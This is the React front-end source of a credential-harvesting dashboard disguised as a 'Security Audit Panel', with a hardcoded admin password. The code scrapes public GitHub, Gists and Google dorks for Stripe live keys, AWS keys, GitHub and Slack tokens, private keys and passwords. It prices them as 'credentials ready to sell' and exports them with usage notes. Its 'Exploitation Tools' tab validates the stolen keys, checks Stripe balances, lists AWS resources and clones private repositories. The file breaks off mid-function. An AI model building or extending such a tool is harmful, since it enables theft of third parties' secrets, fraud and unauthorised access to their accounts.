import { useState, useEffect } from 'react';
import { Search, Database, AlertTriangle, CheckCircle, XCircle, Loader, Eye, Trash2, Download } from 'lucide-react';

export default function SecurityAuditPanel() {
  const [adminKey, setAdminKey] = useState('');
  const [authenticated, setAuthenticated] = useState(false);
  const [searchInput, setSearchInput] = useState('');
  const [searchType, setSearchType] = useState('email');
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState([]);
  const [recentScans, setRecentScans] = useState([]);
  const [stats, setStats] = useState(null);
  const [activeTab, setActiveTab] = useState('scan');
  const [allCredentials, setAllCredentials] = useState([]);
  const [selectedResult, setSelectedResult] = useState(null);
  const [scanLogs, setScanLogs] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [liveProgress, setLiveProgress] = useState([]);
  const [terminalLogs, setTerminalLogs] = useState([]);
  const [exploitResults, setExploitResults] = useState(null);

  const API_URL = process.env.NEXT_PUBLIC_API_URL || 'https://autoclaimtoken.onrender.com';

  const authenticate = () => {
    if (adminKey === 'Peace@25' || adminKey === process.env.NEXT_PUBLIC_ADMIN_KEY) {
      setAuthenticated(true);
      loadStats();
      loadRecentScans();
    } else {
      alert('Invalid admin key');
    }
  };

  const loadStats = async () => {
    try {
      const response = await fetch(`${API_URL}/scraper/stats`, {
        headers: { 'x-admin-key': adminKey }
      });
      const data = await response.json();
      if (data.success) {
        setStats(data.stats);
      }
    } catch (error) {
      console.error('Failed to load stats:', error);
    }
  };

  const loadRecentScans = async () => {
    try {
      const response = await fetch(`${API_URL}/scraper/scans?limit=20`, {
        headers: { 'x-admin-key': adminKey }
      });
      const data = await response.json();
      if (data.success) {
        setRecentScans(data.scans);
      }
    } catch (error) {
      console.error('Failed to load scans:', error);
    }
  };

  const loadAllCredentials = async () => {
    try {
      const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50`, {
        headers: { 'x-admin-key': adminKey }
      });
      const data = await response.json();
      if (data.success) {
        setAllCredentials(data.credentials);
      }
    } catch (error) {
      console.error('Failed to load credentials:', error);
    }
  };

  const startScan = async () => {
    if (!searchInput.trim()) {
      alert('Please enter search input');
      return;
    }

    setScanning(true);
    setResults([]);
    setScanLogs([]);
    setTerminalLogs([]);
    
    // Add initial log
    setTerminalLogs(prev => [...prev, { time: new Date().toLocaleTimeString(), msg: `🚀 Starting scan for "${searchInput.trim()}"...`, type: 'info' }]);

    try {
      const response = await fetch(`${API_URL}/scraper/scan`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify({
          searchInput: searchInput.trim(),
          searchType
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setResults(data.results || []);
        setScanLogs(data.logs || []);
        setTotalValue(data.totalValue || 0);
        
        // Display all backend logs in terminal
        if (data.logs && data.logs.length > 0) {
          setTerminalLogs(prev => [...prev, ...data.logs]);
        }
        
        // Add completion logs
        setTerminalLogs(prev => [
          ...prev,
          { time: new Date().toLocaleTimeString(), msg: `✅ Scan completed!`, type: 'success' },
          { time: new Date().toLocaleTimeString(), msg: `📊 Total found: ${data.totalFound} credentials`, type: 'success' },
          { time: new Date().toLocaleTimeString(), msg: `💰 Total value: $${data.totalValue || 0}`, type: 'success' },
          { time: new Date().toLocaleTimeString(), msg: `🔥 Financial: ${data.breakdown?.financial || 0} | Cloud: ${data.breakdown?.cloud || 0} | API: ${data.breakdown?.api || 0}`, type: 'info' }
        ]);
        
        loadStats();
        loadRecentScans();
        alert(`Scan completed! Found ${data.totalFound} credentials worth $${data.totalValue || 0}`);
      } else {
        setTerminalLogs(prev => [...prev, { time: new Date().toLocaleTimeString(), msg: `❌ Scan failed: ${data.error}`, type: 'error' }]);
        alert('Scan failed: ' + data.error);
      }
    } catch (error) {
      console.error('Scan error:', error);
      alert('Scan failed: ' + error.message);
    } finally {
      setScanning(false);
    }
  };

  const viewScanResults = async (searchId) => {
    setResults([]);
    setActiveTab('results');
    try {
      const response = await fetch(`${API_URL}/scraper/results/${searchId}`, {
        headers: { 'x-admin-key': adminKey }
      });
      const data = await response.json();
      if (data.success) {
        setResults(data.credentials);
      }
    } catch (error) {
      console.error('Failed to load results:', error);
      alert('Failed to load results');
    }
  };

  const deleteCredential = async (id) => {
    if (!confirm('Delete this credential?')) return;

    try {
      const response = await fetch(`${API_URL}/scraper/credential/${id}`, {
        method: 'DELETE',
        headers: { 'x-admin-key': adminKey }
      });
      const data = await response.json();
      if (data.success) {
        setAllCredentials(allCredentials.filter(c => c.id !== id));
        setResults(results.filter(c => c.id !== id));
      }
    } catch (error) {
      console.error('Delete failed:', error);
    }
  };

  const exportJSON = () => {
    const dataStr = JSON.stringify(results, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `security-audit-${Date.now()}.json`;
    link.click();
  };

  const exportCSV = () => {
    const headers = ['Category', 'Type', 'Value', 'Price', 'Severity', 'Source', 'Email', 'Password', 'API_Key', 'Token', 'URL', 'How_To_Use'];
    const rows = results.map(r => [
      r.category || 'other',
      r.credential_type || '',
      r.marketValue ? `$${r.marketValue}` : '',
      r.price || '',
      r.severity || '',
      r.source || '',
      r.email || '',
      r.password || '',
      r.api_key || '',
      r.token || '',
      r.url || '',
      r.use || ''
    ]);
    const csv = [headers.join(','), ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))].join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `credentials-${Date.now()}.csv`;
    link.click();
  };

  const exportByCategory = (category) => {
    const filtered = results.filter(r => r.category === category);
    const dataStr = JSON.stringify(filtered, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `${category}-${Date.now()}.json`;
    link.click();
  };

  const exportHighValue = () => {
    const filtered = results.filter(r => r.marketValue && r.marketValue >= 100);
    const dataStr = JSON.stringify(filtered, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `high-value-${Date.now()}.json`;
    link.click();
  };

  const exportPDF = () => {
    const totalValue = results.reduce((sum, r) => sum + (r.marketValue || 0), 0);
    const byCategory = {
      financial: results.filter(r => r.category === 'financial'),
      cloud: results.filter(r => r.category === 'cloud_access'),
      api: results.filter(r => r.category === 'api_abuse'),
      accounts: results.filter(r => r.category === 'account_access')
    };
    
    const html = `<html><head><title>Credentials Report</title><style>
      body{font-family:Arial;padding:30px;background:#f5f5f5}
      .header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:30px;border-radius:10px;margin-bottom:30px}
      .header h1{margin:0;font-size:32px}
      .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin-bottom:30px}
      .stat{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
      .stat-value{font-size:28px;font-weight:bold;color:#667eea}
      .stat-label{color:#666;font-size:14px;margin-top:5px}
      .category{background:white;padding:20px;border-radius:10px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
      .category h2{margin:0 0 15px 0;color:#333;border-bottom:2px solid #667eea;padding-bottom:10px}
      table{width:100%;border-collapse:collapse}
      th{background:#667eea;color:white;padding:12px;text-align:left;font-size:12px}
      td{padding:10px;border-bottom:1px solid #eee;font-size:11px}
      .critical{background:#fee}
      .high{background:#ffd}
      .price{color:#10b981;font-weight:bold}
    </style></head><body>
      <div class="header">
        <h1>💎 Credentials Report</h1>
        <p>Generated: ${new Date().toLocaleString()}</p>
        <p style="font-size:24px;margin:10px 0 0 0">Total Value: <strong>$${totalValue.toLocaleString()}</strong></p>
      </div>
      <div class="stats">
        <div class="stat"><div class="stat-value">${byCategory.financial.length}</div><div class="stat-label">💰 Financial</div></div>
        <div class="stat"><div class="stat-value">${byCategory.cloud.length}</div><div class="stat-label">☁️ Cloud</div></div>
        <div class="stat"><div class="stat-value">${byCategory.api.length}</div><div class="stat-label">🔌 API</div></div>
        <div class="stat"><div class="stat-value">${byCategory.accounts.length}</div><div class="stat-label">🔑 Accounts</div></div>
      </div>
      ${Object.entries(byCategory).filter(([k,v]) => v.length > 0).map(([cat, items]) => `
        <div class="category">
          <h2>${cat === 'financial' ? '💰 Financial Keys' : cat === 'cloud_access' ? '☁️ Cloud Keys' : cat === 'api_abuse' ? '🔌 API Keys' : '🔑 Account Credentials'}</h2>
          <table>
            <tr><th>Type</th><th>Value</th><th>Credential</th><th>Source</th><th>How To Use</th></tr>
            ${items.map(r => `<tr class="${r.severity}">
              <td>${r.credential_type||''}</td>
              <td class="price">${r.price||''}</td>
              <td style="font-family:monospace;font-size:10px">${r.api_key?.substring(0,40)||r.token?.substring(0,40)||r.password||r.email||''}</td>
              <td>${r.source||''}</td>
              <td style="font-size:10px">${r.use||''}</td>
            </tr>`).join('')}
          </table>
        </div>
      `).join('')}
    </body></html>`;
    const blob = new Blob([html], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `credentials-report-${Date.now()}.html`;
    link.click();
    alert('HTML report downloaded. Open in browser and Print to PDF (Ctrl+P).');
  };

  useEffect(() => {
    if (authenticated && activeTab === 'database') {
      loadAllCredentials();
    }
  }, [authenticated, activeTab]);

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-2xl p-8 max-w-md w-full border border-purple-500/30">
          <div className="text-center mb-6">
            <Database className="w-16 h-16 text-purple-400 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-white mb-2">Security Audit Panel</h1>
            <p className="text-gray-400">Admin Access Required</p>
          </div>
          
          <input
            type="password"
            placeholder="Enter Admin Key"
            value={adminKey}
            onChange={(e) => setAdminKey(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && authenticate()}
            className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white mb-4 focus:outline-none focus:border-purple-500"
          />
          
          <button
            onClick={authenticate}
            className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-3 rounded-lg transition"
          >
            Access Panel
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 p-4">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="bg-gray-800 rounded-2xl p-6 mb-6 border border-purple-500/30">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-white mb-2">Security Audit Dashboard</h1>
              <p className="text-gray-400">Monitor security exposures across platforms</p>
            </div>
            <Database className="w-12 h-12 text-purple-400" />
          </div>
        </div>

        {/* Stats */}
        {stats && (
          <div>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
              <div className="bg-gray-800 rounded-xl p-4 border border-purple-500/30">
                <div className="text-gray-400 text-sm mb-1">Total Credentials</div>
                <div className="text-3xl font-bold text-white">{stats.totalCredentials}</div>
              </div>
              <div className="bg-gray-800 rounded-xl p-4 border border-green-500/30">
                <div className="text-gray-400 text-sm mb-1">Total Scans</div>
                <div className="text-3xl font-bold text-white">{stats.totalScans}</div>
              </div>
              <div className="bg-gray-800 rounded-xl p-4 border border-red-500/30">
                <div className="text-gray-400 text-sm mb-1">Critical</div>
                <div className="text-3xl font-bold text-white">
                  {stats.bySeverity.find(s => s.severity === 'critical')?.count || 0}
                </div>
              </div>
              <div className="bg-gray-800 rounded-xl p-4 border border-yellow-500/30">
                <div className="text-gray-400 text-sm mb-1">High</div>
                <div className="text-3xl font-bold text-white">
                  {stats.bySeverity.find(s => s.severity === 'high')?.count || 0}
                </div>
              </div>
            </div>
            <button
              onClick={async () => {
                try {
                  const response = await fetch(`${API_URL}/scraper/duplicates`, {
                    headers: { 'x-admin-key': adminKey }
                  });
                  const data = await response.json();
                  if (data.success && data.totalDuplicates > 0) {
                    alert(`🚨 Found ${data.totalDuplicates} duplicates!\n\nGo to Database tab to clean them.`);
                  }
                } catch (error) {}
              }}
              className="w-full bg-orange-900/30 border border-orange-500 rounded-xl p-3 hover:bg-orange-900/50 transition text-left"
            >
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-orange-400 text-sm">Database Health</div>
                  <div className="text-white text-xs mt-1">Click to check for duplicates</div>
                </div>
                <AlertTriangle className="w-5 h-5 text-orange-400" />
              </div>
            </button>
          </div>
        )}

        {/* Tabs */}
        <div className="flex gap-2 mb-6 flex-wrap">
          {['scan', 'results', 'critical', 'exploit', 'history', 'database'].map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-6 py-3 rounded-lg font-semibold transition ${
                activeTab === tab
                  ? 'bg-purple-600 text-white'
                  : tab === 'critical'
                  ? 'bg-red-900 text-red-300 hover:bg-red-800'
                  : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
              }`}
            >
              {tab === 'critical' ? '🔥 CRITICAL' : tab === 'exploit' ? '⚡ EXPLOIT' : tab.charAt(0).toUpperCase() + tab.slice(1)}
            </button>
          ))}
        </div>
        
        {/* Value Calculator & Category Filters */}
        {(activeTab === 'results' || activeTab === 'critical') && results.length > 0 && (
          <div className="space-y-4 mb-6">
            {/* Total Value */}
            <div className="bg-gradient-to-r from-green-900/50 to-emerald-900/50 rounded-xl p-6 border border-green-500">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-green-400 text-sm mb-1">💰 TOTAL MARKET VALUE</div>
                  <div className="text-white text-4xl font-bold">${totalValue.toLocaleString()}</div>
                  <div className="text-green-300 text-sm mt-1">{results.length} credentials ready to sell</div>
                </div>
                <button onClick={exportHighValue} className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition">
                  Export High Value ($100+)
                </button>
              </div>
            </div>

            {/* Category Breakdown */}
            <div className="bg-gray-800 rounded-xl p-4 border border-purple-500/30">
              <div className="text-white font-semibold mb-3">📊 Bulk Export by Category:</div>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                <button onClick={() => exportByCategory('financial')} className="bg-green-900/30 border border-green-500 rounded-lg p-3 hover:bg-green-900/50 transition">
                  <div className="text-green-400 font-bold text-lg">{results.filter(r => r.category === 'financial').length}</div>
                  <div className="text-green-300 text-xs">💰 Financial</div>
                  <div className="text-gray-400 text-xs mt-1">$500-$2000 each</div>
                </button>
                <button onClick={() => exportByCategory('cloud_access')} className="bg-blue-900/30 border border-blue-500 rounded-lg p-3 hover:bg-blue-900/50 transition">
                  <div className="text-blue-400 font-bold text-lg">{results.filter(r => r.category === 'cloud_access').length}</div>
                  <div className="text-blue-300 text-xs">☁️ Cloud</div>
                  <div className="text-gray-400 text-xs mt-1">$300-$1000 each</div>
                </button>
                <button onClick={() => exportByCategory('api_abuse')} className="bg-purple-900/30 border border-purple-500 rounded-lg p-3 hover:bg-purple-900/50 transition">
                  <div className="text-purple-400 font-bold text-lg">{results.filter(r => r.category === 'api_abuse').length}</div>
                  <div className="text-purple-300 text-xs">🔌 API Keys</div>
                  <div className="text-gray-400 text-xs mt-1">$10-$100 each</div>
                </button>
                <button onClick={() => exportByCategory('account_access')} className="bg-yellow-900/30 border border-yellow-500 rounded-lg p-3 hover:bg-yellow-900/50 transition">
                  <div className="text-yellow-400 font-bold text-lg">{results.filter(r => r.category === 'account_access').length}</div>
                  <div className="text-yellow-300 text-xs">🔑 Accounts</div>
                  <div className="text-gray-400 text-xs mt-1">$1-$10 each</div>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Scan Tab */}
        {activeTab === 'scan' && (
          <div className="bg-gray-800 rounded-2xl p-6 border border-purple-500/30">
            <h2 className="text-2xl font-bold text-white mb-4">Start Security Audit</h2>
            
            <div className="mb-4">
              <label className="block text-gray-400 mb-2">Search Type</label>
              <select
                value={searchType}
                onChange={(e) => setSearchType(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-purple-500"
              >
                <option value="email">Email Address</option>
                <option value="username">Username</option>
                <option value="domain">Domain</option>
                <option value="company">Company Name</option>
                <option value="github">GitHub Username</option>
                <option value="keyword">Keyword</option>
              </select>
            </div>

            <div className="mb-4">
              <label className="block text-gray-400 mb-2">Search Input</label>
              <input
                type="text"
                placeholder="Enter email, username, domain, etc..."
                value={searchInput}
                onChange={(e) => setSearchInput(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-purple-500"
              />
            </div>

            <button
              onClick={startScan}
              disabled={scanning}
              className="w-full bg-purple-600 hover:bg-purple-700 disabled:bg-gray-600 text-white font-semibold py-4 rounded-lg transition flex items-center justify-center gap-2"
            >
              {scanning ? (
                <>
                  <Loader className="w-5 h-5 animate-spin" />
                  Scanning...
                </>
              ) : (
                <>
                  <Search className="w-5 h-5" />
                  Start Scan
                </>
              )}
            </button>

            {/* Quick High-Value Targets */}
            <div className="mt-6 bg-gradient-to-r from-green-900/30 to-yellow-900/30 rounded-lg p-4 border border-green-500/50">
              <div className="text-green-400 font-bold mb-3 flex items-center gap-2">
                <span>💎</span> QUICK SCAN: High-Value Targets
              </div>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                <button
                  onClick={() => { setSearchInput('sk_live_'); setSearchType('keyword'); }}
                  className="bg-green-600 hover:bg-green-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">💰 Stripe Live Keys</div>
                  <div className="text-xs opacity-80">$500-$2000 | REAL MONEY</div>
                </button>
                <button
                  onClick={() => { setSearchInput('AKIA'); setSearchType('keyword'); }}
                  className="bg-blue-600 hover:bg-blue-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">☁️ AWS Keys</div>
                  <div className="text-xs opacity-80">$300-$1000 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('ghp_'); setSearchType('keyword'); }}
                  className="bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">🔑 GitHub Tokens</div>
                  <div className="text-xs opacity-80">$50-$200 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('xox'); setSearchType('keyword'); }}
                  className="bg-yellow-600 hover:bg-yellow-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">💬 Slack Tokens</div>
                  <div className="text-xs opacity-80">$100-$500 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('-----BEGIN RSA PRIVATE KEY-----'); setSearchType('keyword'); }}
                  className="bg-red-600 hover:bg-red-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">🔐 Private Keys</div>
                  <div className="text-xs opacity-80">$200-$800 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('api_key'); setSearchType('keyword'); }}
                  className="bg-indigo-600 hover:bg-indigo-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">🔌 API Keys</div>
                  <div className="text-xs opacity-80">$10-$100 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('password'); setSearchType('keyword'); }}
                  className="bg-orange-600 hover:bg-orange-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">🔑 Passwords</div>
                  <div className="text-xs opacity-80">$1-$10 each</div>
                </button>
                <button
                  onClick={() => { setSearchInput('.env'); setSearchType('keyword'); }}
                  className="bg-pink-600 hover:bg-pink-700 text-white p-3 rounded-lg transition text-left"
                >
                  <div className="font-bold text-sm">📄 .env Files</div>
                  <div className="text-xs opacity-80">Mixed value</div>
                </button>
              </div>
              <div className="mt-3 text-xs text-gray-400">
                Click any target to auto-fill search. Then click "Start Scan" above.
              </div>
            </div>

            <div className="mt-4 text-sm text-gray-400">
              <p className="mb-2">Sources scanned:</p>
              <ul className="list-disc list-inside space-y-1">
                <li>GitHub repositories (API keys, secrets, passwords)</li>
                <li>GitHub Gists (public code snippets)</li>
                <li>Google dorks (exposed files)</li>
              </ul>
            </div>

            {/* Terminal-Style Live Progress */}
            {(scanning || terminalLogs.length > 0) && (
              <div className="mt-6 bg-black rounded-lg p-4 border border-green-500/50 font-mono text-sm">
                <div className="flex items-center justify-between mb-3 pb-2 border-b border-gray-700">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 rounded-full bg-red-500"></div>
                    <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                    <div className="w-3 h-3 rounded-full bg-green-500"></div>
                    <span className="text-gray-400 ml-3">Live Scan Terminal</span>
                  </div>
                  {scanning && <Loader className="w-4 h-4 text-green-400 animate-spin" />}
                </div>
                <div className="space-y-1 max-h-96 overflow-y-auto" style={{scrollBehavior: 'smooth'}}>
                  {terminalLogs.map((log, index) => (
                    <div key={index} className={`flex gap-2 text-xs ${
                      log.type === 'success' ? 'text-green-400' :
                      log.type === 'error' ? 'text-red-400' :
                      log.type === 'extract' ? 'text-yellow-400' :
                      'text-gray-300'
                    }`}>
                      <span className="text-gray-500">[{log.time}]</span>
                      <span>{log.msg}</span>
                    </div>
                  ))}
                  {scanning && (
                    <div className="flex gap-2 text-xs text-green-400 animate-pulse">
                      <span className="text-gray-500">[{new Date().toLocaleTimeString()}]</span>
                      <span>⏳ Scanning GitHub repositories...</span>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Exploit Tab */}
        {activeTab === 'exploit' && (
          <div className="bg-gray-800 rounded-2xl p-6 border border-yellow-500/30">
            <h2 className="text-2xl font-bold text-yellow-400 mb-4">⚡ Exploitation Tools</h2>
            
            {/* Load Database Credentials */}
            <div className="bg-blue-900/30 border border-blue-500 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-white font-bold">📊 Database Credentials</div>
                  <div className="text-gray-400 text-sm">Load credentials from database</div>
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={async () => {
                      try {
                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50000&category=high-value`, {
                          headers: { 'x-admin-key': adminKey }
                        });
                        const data = await response.json();
                        if (data.success) {
                          setResults(data.credentials);
                          alert(`Loaded ${data.credentials.length} HIGH-VALUE credentials!\n\nStripe: ${data.credentials.filter(c => c.credential_type === 'stripe_key').length}\nAWS: ${data.credentials.filter(c => c.credential_type === 'aws_key').length}\nGitHub: ${data.credentials.filter(c => c.credential_type === 'github_token').length}`);
                        }
                      } catch (error) {
                        alert('Failed to load: ' + error.message);
                      }
                    }}
                    className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition"
                  >
                    🔥 High-Value Only
                  </button>
                  <button
                    onClick={async () => {
                      try {
                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=10000`, {
                          headers: { 'x-admin-key': adminKey }
                        });
                        const data = await response.json();
                        if (data.success) {
                          setResults(data.credentials);
                          alert(`Loaded ${data.credentials.length} credentials from database!`);
                        }
                      } catch (error) {
                        alert('Failed to load: ' + error.message);
                      }
                    }}
                    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition"
                  >
                    Load All ({stats?.totalCredentials || 0})
                  </button>
                </div>
              </div>
            </div>
            
            <div className="bg-gray-900 rounded-lg p-4 mb-4 border border-gray-700">
              <div className="text-white font-semibold mb-2">Current Loaded: {results.length} credentials</div>
              <div className="text-sm text-gray-400">
                Financial: {results.filter(r => r.category === 'financial').length} | 
                Cloud: {results.filter(r => r.category === 'cloud_access').length} | 
                GitHub: {results.filter(r => r.credential_type === 'github_token').length}
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Auto-Tester */}
              <div className="bg-gradient-to-br from-blue-900/30 to-blue-800/30 border border-blue-500 rounded-xl p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="text-3xl">🧪</div>
                  <div>
                    <h3 className="text-white font-bold text-lg">Auto-Tester</h3>
                    <p className="text-gray-400 text-sm">Test all keys automatically</p>
                  </div>
                </div>
                <button 
                  onClick={async () => {
                    if (!results.length) return alert('No credentials to test');
                    if (!confirm(`Test ALL ${results.length} credentials? This may take several minutes.`)) return;
                    const btn = event.target;
                    btn.disabled = true;
                    let count = 0;
                    const interval = setInterval(() => {
                      count++;
                      btn.textContent = `Testing... ${count}s`;
                    }, 1000);
                    try {
                      const response = await fetch(`${API_URL}/api/exploit/test-all`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                        body: JSON.stringify({ credentials: results })
                      });
                      const data = await response.json();
                      if (data.success) {
                        setExploitResults({ type: 'test', data });
                        alert(`Tested ${data.tested} keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\nActive: ${data.summary.active}`);
                      }
                    } catch (error) {
                      alert('Test failed: ' + error.message);
                    } finally {
                      clearInterval(interval);
                      btn.disabled = false;
                      btn.textContent = `Test All Keys (${results.length})`;
                    }
                  }}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
                >
                  Test All Keys ({results.length})
                </button>
                <div className="mt-3 text-xs text-gray-400">
                  Tests Stripe, AWS, GitHub, Slack tokens for validity
                </div>
              </div>

              {/* Balance Checker */}
              <div className="bg-gradient-to-br from-green-900/30 to-green-800/30 border border-green-500 rounded-xl p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="text-3xl">💰</div>
                  <div>
                    <h3 className="text-white font-bold text-lg">Balance Checker</h3>
                    <p className="text-gray-400 text-sm">Check Stripe account balances</p>
                  </div>
                </div>
                <button
                  onClick={async () => {
                    const stripeKeys = results.filter(r => r.category === 'financial');
                    if (!stripeKeys.length) return alert('No Stripe keys found');
                    const maxKeys = 500;
                    const keysToCheck = stripeKeys.length > maxKeys ? maxKeys : stripeKeys.length;
                    if (!confirm(`Check ${keysToCheck} Stripe keys? (Limited to ${maxKeys} max)\n\nEstimated time: ${Math.ceil(keysToCheck / 10)} seconds`)) return;
                    const btn = event.target;
                    btn.disabled = true;
                    let count = 0;
                    const interval = setInterval(() => {
                      count++;
                      btn.textContent = `Checking... ${count}s / ~${Math.ceil(keysToCheck / 10)}s`;
                    }, 1000);
                    try {
                      const controller = new AbortController();
                      const timeout = setTimeout(() => controller.abort(), 300000); // 5 min max
                      
                      const response = await fetch(`${API_URL}/api/exploit/check-balances`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                        body: JSON.stringify({ credentials: stripeKeys.slice(0, maxKeys), batchSize: 100 }),
                        signal: controller.signal
                      });
                      clearTimeout(timeout);
                      const data = await response.json();
                      if (data.success) {
                        setExploitResults({ type: 'balance', data });
                        const msg = `Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`;
                        if (stripeKeys.length > maxKeys) {
                          alert(msg + `\n\nNote: Limited to ${maxKeys} keys. Load fewer credentials or run multiple batches.`);
                        } else {
                          alert(msg);
                        }
                      }
                    } catch (error) {
                      if (error.name === 'AbortError') {
                        alert('Check timed out after 5 minutes. Try with fewer keys.');
                      } else {
                        alert('Check failed: ' + error.message);
                      }
                    } finally {
                      clearInterval(interval);
                      btn.disabled = false;
                      btn.textContent = `Check Balances (${stripeKeys.length})`;
                    }
                  }}
                  className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
                >
                  Check Balances ({results.filter(r => r.category === 'financial').length})
                </button>
                <div className="mt-3 text-xs text-gray-400">
                  Shows available balance for each Stripe key
                </div>
              </div>

              {/* AWS Scanner */}
              <div className="bg-gradient-to-br from-purple-900/30 to-purple-800/30 border border-purple-500 rounded-xl p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="text-3xl">☁️</div>
                  <div>
                    <h3 className="text-white font-bold text-lg">AWS Scanner</h3>
                    <p className="text-gray-400 text-sm">List all AWS resources</p>
                  </div>
                </div>
                <button
                  onClick={async () => {
                    const awsKeys = results.filter(r => r.category === 'cloud_access');
                    if (!awsKeys.length) return alert('No AWS keys found');
                    try {
                      const response = await fetch(`${API_URL}/api/exploit/scan-aws`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
                        body: JSON.stringify({ credentials: awsKeys })
                      });
                      const data = await response.json();
                      if (data.success) {
                        alert(`Found ${data.awsKeys} AWS keys\n\nInstructions:\n${data.instructions.join('\n')}`);
                        console.log('AWS keys:', data.keys);
                      }
                    } catch (error) {
                      alert('Scan failed: ' + error.message);
                    }
                  }}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-lg font-semibold transition"
                >
                  Scan AWS ({results.filter(r => r.category === 'cloud_access').length})
                </button>
                <div className="mt-3 text-xs text-gray-400">
                  Lists EC2, S3, RDS, Lambda resources
                </div>
              </div>

              {/* GitHub Cloner */}
              <div className="bg-gradient-to-br from-pink-900/30 to-pink-800/30 border border-pink-500 rounded-xl p-6">
                <div className="flex items-center gap-3 mb-4">
                  <div className="text-3xl">📦</div>
                  <div>
                    <h3 className="text-white font-bold text-lg">GitHub Cloner</h3>
                    <p className="text-gray-400 text-sm">Download private repos</p>
                  </div>
                </div>
                <button
                  onClick={async () => {
                    const githubTokens = results.filter(r => r.credential_type === 'github_token');
                    if (!githubTokens.length) return alert('No GitHub tokens found');
                    const btn = event.target;
                    btn.disabled = true;
                    btn.textContent = 'Scanning...';
                    try {
